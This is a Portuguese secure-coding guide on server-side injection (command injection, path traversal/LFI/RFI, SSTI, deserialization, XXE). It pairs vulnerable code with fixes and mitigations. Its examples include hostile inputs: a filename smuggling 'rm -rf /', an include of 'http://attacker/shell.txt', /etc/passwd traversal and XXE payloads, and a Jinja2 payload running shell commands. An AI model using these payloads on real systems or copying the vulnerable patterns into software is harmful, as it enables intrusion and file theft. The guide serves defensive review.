# Análise — Injeções Server-Side

> Categoria-mãe das injeções server-side: OS Command, LFI/RFI, SSTI, Deserialização e XXE. Todas partilham a mesma raiz: **input não confiável que chega a um interpretador/parser sem ser sanitizado**.

## 1. OS Command Injection

Input do utilizador chega a função que executa shell.

### Funções perigosas por linguagem

| Linguagem | Funções a evitar com input não confiável |
|---|---|
| **PHP** | `exec`, `shell_exec`, `system`, `passthru`, `proc_open`, `popen`, backticks `` ` `` |
| **Python** | `os.system`, `os.popen`, `subprocess.*` com `shell=True`, `commands.*` |
| **Node.js** | `child_process.exec`, `execSync`, `spawn(cmd, {shell: true})` |
| **Java** | `Runtime.exec(String)`, `ProcessBuilder` com input direto |
| **Ruby** | `system`, `exec`, `` ` ``, `IO.popen`, `Open3.*` |
| **Go** | `exec.Command(input)` quando input é a string completa |
| **C#/.NET** | `Process.Start(string)` com input direto |

### Sinais de alarme

```python
# BAD — Python
import os
os.system(f"convert {filename} output.png")  # filename = "x; rm -rf /"

# BAD — subprocess com shell=True
subprocess.run(f"ping {host}", shell=True)

# GOOD
subprocess.run(["convert", filename, "output.png"], shell=False)
subprocess.run(["ping", "-c", "1", host], shell=False, timeout=5)
```

```javascript
// BAD — Node
const { exec } = require('child_process');
exec(`git clone ${userInput}`);

// GOOD
const { execFile } = require('child_process');
execFile('git', ['clone', userInput], { timeout: 30000 });
```

```php
// BAD
exec("ffmpeg -i $file output.mp4");

// GOOD
$file = escapeshellarg($file);
exec("ffmpeg -i $file output.mp4");
// MELHOR: usar lib (FFMpeg PHP) que não chama shell
```

```java
// BAD
Runtime.getRuntime().exec("convert " + filename + " out.png");

// GOOD
ProcessBuilder pb = new ProcessBuilder("convert", filename, "out.png");
pb.redirectErrorStream(true);
Process p = pb.start();
```

```go
// BAD
exec.Command("sh", "-c", "ping " + host)

// GOOD
exec.Command("ping", "-c", "1", host)
```

### Mitigações universais
- **Usar APIs estruturadas** (array de args), nunca string de shell.
- **Allowlist** de comandos permitidos (`if cmd not in {'convert', 'ffmpeg'}: reject`).
- **Validar input** com regex restritivo (alphanumeric only, etc.).
- **Sandbox** com containers, AppArmor, seccomp se a operação tem que ser dinâmica.

## 2. Path Traversal / LFI / RFI

Input controla path de ficheiro, permite leitura/inclusão arbitrária.

### Padrões perigosos

```php
// BAD — LFI
include $_GET['page'] . '.php';        // ?page=../../etc/passwd%00
require_once "templates/" . $_GET['t']; // ?t=../config

// BAD — RFI (PHP allow_url_include = On)
include $_GET['url'];                   // ?url=http://attacker/shell.txt

// GOOD — allowlist
$allowed = ['home', 'about', 'contact'];
$page = in_array($_GET['page'], $allowed, true) ? $_GET['page'] : 'home';
include "pages/$page.php";
```

```python
# BAD
with open(f"/var/data/{user_input}") as f:  # user_input = "../../etc/passwd"
    return f.read()

# GOOD
import os
base = "/var/data"
target = os.path.normpath(os.path.join(base, user_input))
if not target.startswith(base + os.sep):
    raise ValueError("path traversal")
with open(target) as f:
    return f.read()
```

```javascript
// BAD — Node
const path = req.query.file;
res.sendFile(path);

// GOOD
const path = require('path');
const safe = path.normalize(req.query.file).replace(/^(\.\.[/\\])+/, '');
const full = path.join('/var/data', safe);
if (!full.startsWith('/var/data/')) return res.sendStatus(400);
res.sendFile(full);
```

```java
// GOOD — Java
Path basePath = Paths.get("/var/data").toAbsolutePath().normalize();
Path requested = basePath.resolve(userInput).normalize();
if (!requested.startsWith(basePath)) {
    throw new SecurityException("Path traversal");
}
```

### Variantes a verificar
- `../`, `..\\`, `..%2F`, `....//`, `..%c0%af`, `%2e%2e/`
- Null byte: `safe.txt%00.exe` (legacy PHP < 5.3)
- Absolute paths: `/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`
- UNC paths em Windows: `\\attacker\share\evil`

## 3. Server-Side Template Injection (SSTI)

Input do utilizador chega ao motor de templates server-side. Frequentemente escala para RCE.

### Engines vulneráveis

| Linguagem | Engines | Payload teste |
|---|---|---|
| Python | Jinja2, Mako, Django (Tag {%load%}) | `{{7*7}}` → `49` |
| PHP | Twig, Smarty, Blade (raras), Mustache | `{{7*7}}`, `{$7*7}` |
| Node | Pug, EJS, Handlebars, Mustache | `{{7*7}}`, `<%= 7*7 %>` |
| Java | Velocity, Freemarker, Thymeleaf | `${7*7}` |
| Ruby | ERB, Slim, Liquid | `<%= 7*7 %>`, `{{7*7}}` |
| .NET | Razor | `@(7*7)` |

### Sinais de alarme

```python
# BAD — Flask + Jinja2
from flask import render_template_string
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template_string(f"Hello {name}")
    # ?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# GOOD
return render_template('hello.html', name=name)  # template ficheiro, name passa como variável
```

```javascript
// BAD — Express + EJS
app.get('/', (req, res) => {
  res.render('home', { html: req.query.html });
  // template: <%- html %>  (raw output)
});

// GOOD — escapar
// template: <%= html %>  (escaped output)
```

### Detetar SSTI mentalmente
1. Procura funções tipo `render_template_string`, `Template().render()`, `eval_template`.
2. Procura concatenação de input em strings que vão para esses funções.
3. Verifica se input é interpolado **dentro** do template antes do render.

### Mitigação
- **Nunca** passar input do utilizador como template — só como **variável** dentro de template estático.
- Sandbox o template engine (Jinja2 `SandboxedEnvironment`, etc.) — mas mesmo isto tem bypasses históricos.

## 4. Insecure Deserialization

Desserializar dados de fonte não confiável → atacante constroi objeto arbitrário → RCE via gadget chains.

### Funções perigosas

| Linguagem | Função | Severidade |
|---|---|---|
| PHP | `unserialize` | Crítico |
| Python | `pickle.loads`, `marshal.loads`, `shelve` | Crítico |
| Java | `ObjectInputStream.readObject` | Crítico |
| Ruby | `Marshal.load`, `YAML.load` (não `safe_load`) | Crítico |
| .NET | `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter` | Crítico |
| Node | `node-serialize`, `serialize-javascript` mal usados | Alto |

### Sinais de alarme

```php
// BAD
$data = unserialize($_COOKIE['session']);

// GOOD — usar JSON
$data = json_decode($_COOKIE['session'], true);
// melhor: armazenar session_id e dados em servidor
```

```python
# BAD
import pickle
data = pickle.loads(request.body)

# GOOD — JSON
import json
data = json.loads(request.body)
```

```ruby
# BAD
YAML.load(params[:data])

# GOOD
YAML.safe_load(params[:data])
```

```java
// BAD
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Object obj = ois.readObject();

// GOOD — usar JSON (Jackson, Gson) com schema validation
ObjectMapper m = new ObjectMapper();
MyDto dto = m.readValue(socket.getInputStream(), MyDto.class);
```

### Mitigações universais
- **Preferir JSON** sobre serialização nativa.
- Se serialização nativa for obrigatória: **assinar** os dados (HMAC) antes de serializar e verificar antes de desserializar.
- Allowlist de classes que podem ser desserializadas.

## 5. XXE (XML External Entity)

Parser XML processa entidades externas → leitura de ficheiros, SSRF, DoS.

### Payload exemplo
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Onde aparece
- APIs SOAP
- Upload de SVG, DOCX, XLSX, ODT
- Parse de RSS/Atom feeds
- Webhooks que recebem XML
- Exportação/importação de dados (XML config files)

### Mitigação por linguagem

```php
// BAD — PHP < 8 com libxml < 2.9
$doc = new DOMDocument();
$doc->loadXML($xml);

// GOOD — PHP 8+
// Por default LIBXML_NO_XXE; em versões antigas:
$doc->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);
// ou
libxml_disable_entity_loader(true); // PHP < 8
```

```python
# BAD
from xml.etree import ElementTree as ET
ET.parse(file)  # CPython é seguro por default desde 3.7+

# GOOD — usar defusedxml
from defusedxml.ElementTree import parse
parse(file)
```

```java
// BAD
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// GOOD
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

```javascript
// Node — libxmljs
const libxml = require('libxmljs');
libxml.parseXml(data, { noent: false, dtdload: false, dtdvalid: false });
```

## Quick wins (faz isto antes de entregar)

- [ ] Listar todos os usos de `exec`/`system`/`subprocess` no código — passar a array-form com allowlist
- [ ] Listar todos os `include`/`require`/`open(path)` com input dinâmico — adicionar allowlist e path normalization
- [ ] Listar todos os `render_template_string`/`Template().render(input)` — passar input só como variável
- [ ] Substituir `unserialize`/`pickle.loads`/`ObjectInputStream` por JSON
- [ ] Configurar parsers XML para desativar entidades externas
- [ ] Para PHP: `allow_url_include = Off` em `php.ini`
- [ ] Para Python: usar `defusedxml`
- [ ] Para todas as deserializações inevitáveis: HMAC sign + verify

## Falsos positivos
- `exec` com strings literais sem input dinâmico — OK
- `pickle.loads` em código interno (cache do Redis com dados próprios) — aceitável se o canal é confiável
- XXE em parsers que **não recebem** XML externo (parse de config gerado pela própria app) — verificar source

## Severidade — em linguagem honesta
- **Crítico:** OS Command Injection em endpoint não autenticado → RCE imediato
- **Crítico:** SSTI confirmado em endpoint público
- **Crítico:** `unserialize`/`pickle.loads` de input não confiável (RCE quase garantido com gadget chains)
- **Crítico:** XXE em endpoint não autenticado (leitura de `/etc/passwd`, SSRF)
- **Alto:** LFI em endpoint público (leitura de ficheiros sensíveis)
- **Alto:** Path traversal em download endpoint
- **Médio:** RFI bloqueado por config mas código vulnerável (defesa em profundidade falhou)
